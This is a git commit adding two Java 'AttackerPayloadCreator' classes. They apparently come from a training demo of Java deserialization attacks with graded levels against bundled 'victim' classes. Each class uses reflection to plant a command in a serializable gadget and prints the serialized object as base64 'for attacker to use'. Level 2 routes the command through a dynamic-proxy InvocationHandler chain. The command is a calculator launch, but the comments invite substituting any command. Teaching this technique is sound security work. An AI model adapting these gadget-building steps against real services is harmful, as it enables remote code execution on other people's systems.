101ea698d7eedf298a676745bc270849d67b6f31
Christian Schneider <mail@Christian-Schneider.net>
2016-04-10 17:54:12 +0200

    initial commit

---
+++ attacker-serializing/src/attacker/level1/AttackerPayloadCreator.java
@@ -0,0 +1,37 @@
+package attacker.level1;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Base64;
+
+import victim.level1.SomeDangerousSerializableThing;
+
+
+public class AttackerPayloadCreator {
+
+	public static void main(String[] args) throws Exception {
+		System.out.println("Serializing a malicious payload:");
+		ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		
+		try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
+			
+			// create the Gadget and set the desired payload data in it
+			// (if private, use reflection)
+			SomeDangerousSerializableThing gadget = new SomeDangerousSerializableThing();
+
+			// ... set the malicious value for the private command field
+			Field commandField = SomeDangerousSerializableThing.class.getDeclaredField("command");
+			commandField.setAccessible(true);
+			commandField.set(gadget, "/Applications/Calculator.app/Contents/MacOS/Calculator"); // or calc.exe on windows or whatever command on linux 
+			
+			// serialize the gadget
+			oos.writeObject(gadget);
+		}
+
+		// Print for attacker to use
+		String base64 = Base64.getEncoder().encodeToString(baos.toByteArray());
+		System.out.println(base64);
+	}
+
+}
---
+++ attacker-serializing/src/attacker/level2/AttackerPayloadCreator.java
@@ -0,0 +1,56 @@
+package attacker.level2;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Proxy;
+import java.util.Base64;
+import java.util.Map;
+
+import victim.level2.DangerousSerializableInvocationHandler;
+import victim.level2.SomeHarmlessSerializableThing;
+
+
+public class AttackerPayloadCreator {
+
+	public static void main(String[] args) throws Exception {
+		System.out.println("Serializing a malicious payload:");
+		ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		
+		try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
+		
+			// use the dangerous serializable InvocationHandler from victim's ClassPath
+			DangerousSerializableInvocationHandler handler = 
+					new DangerousSerializableInvocationHandler();
+			
+			// create the proxy instance with it:
+			Map mapViaProxy = 
+					(Map) Proxy.newProxyInstance(
+							Thread.currentThread().getContextClassLoader(), 
+							new Class[]{Map.class}, 
+							handler);
+			
+			// create the Gadget and set the desired payload data in it
+			// (if private, use reflection)
+			SomeHarmlessSerializableThing gadget = new SomeHarmlessSerializableThing();
+
+			// ... set the "map" to our attacker-created proxy
+			Field mapField = SomeHarmlessSerializableThing.class.getDeclaredField("mapNameToSomething");
+			mapField.setAccessible(true);
+			mapField.set(gadget, mapViaProxy);
+			
+			// ... set the "name" (used as argument to get call of map) to desired command to execute
+			Field nameField = SomeHarmlessSerializableThing.class.getDeclaredField("nameLastAdded");
+			nameField.setAccessible(true);
+			nameField.set(gadget, "/Applications/Calculator.app/Contents/MacOS/Calculator"); // or calc.exe on windows or whatever command on linux 
+			
+			// serialize the gadget
+			oos.writeObject(gadget);
+		}
+
+		// Print for attacker to use
+		String base64 = Base64.getEncoder().encodeToString(baos.toByteArray());
+		System.out.println(base64);
+	}
+
+}
